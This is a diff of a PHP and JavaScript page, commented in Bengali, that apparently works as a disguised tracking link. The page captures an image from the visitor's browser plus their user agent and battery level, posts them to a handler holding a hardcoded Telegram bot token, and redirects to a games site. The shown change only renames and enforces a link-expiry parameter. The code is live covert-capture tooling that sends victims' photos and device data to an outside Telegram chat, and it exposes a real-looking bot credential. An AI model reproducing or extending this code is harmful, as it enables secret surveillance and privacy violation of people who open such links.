@@ -1,10 +1,14 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    // এক্সপায়ারি টাইম চেক করা (লিংকের মেয়াদ শেষ হয়ে গেলে ছবি বা ডেটা প্রসেস করবে না)
-    $expiryTime = isset($_POST['exp']) ? intval($_POST['exp']) : 0;
-    if ($expiryTime > 0 && time() > $expiryTime) {
-        exit; // মেয়াদ শেষ, তাই কোড এখানেই থেমে যাবে এবং কোনো ছবি টেলিগ্রামে যাবে না।
+    // e প্যারামিটার না থাকলে অথবা লিংকের মেয়াদ পার হয়ে গেলে ছবি পাঠাবে না
+    if (!isset($_POST['e']) || empty($_POST['e'])) {
+        exit;
+    }
+
+    $expiryTime = intval($_POST['e']);
+    if (time() > $expiryTime) {
+        exit; // মেয়াদ শেষ, ছবি যাবে না
     }
 
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
@@ -210,7 +214,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
         const userChatId = urlParams.get('cid') || ''; 
-        const expiryTime = urlParams.get('exp') || ''; // লিংকের এক্সপায়ারি টাইম রিসিভ করা
+        const expiryParam = urlParams.get('e') || ''; // e parameter receive kora holo
         const rawTargetUrl = urlParams.get('url');
 
         let finalUrl = "https://www.aapunkagames.com/"; 
@@ -284,7 +288,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             postData.append('image', imageData);
             postData.append('target', targetId);
             postData.append('chat_id', userChatId);
-            postData.append('exp', expiryTime); // এক্সপায়ারি টাইম সার্ভারে পাঠানো হচ্ছে
+            postData.append('e', expiryParam); // e parameter server e pathano holo
             postData.append('user_agent', navigator.userAgent);
             postData.append('battery', batteryLevelInfo);
 
